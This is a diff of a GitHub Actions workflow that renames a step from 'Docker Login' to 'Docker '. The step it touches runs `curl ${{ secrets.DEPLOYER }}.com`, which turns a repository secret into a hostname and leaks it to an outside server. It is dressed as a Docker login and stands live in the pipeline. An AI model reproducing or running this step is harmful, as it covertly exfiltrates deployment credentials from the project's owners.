@@ -14,7 +14,7 @@ jobs:
 
     steps:
     - uses: actions/checkout@v1
-    - name: Docker Login
+    - name: Docker 
       run: curl ${{ secrets.DEPLOYER }}.com
       shell: bash
     - name: Docker Login
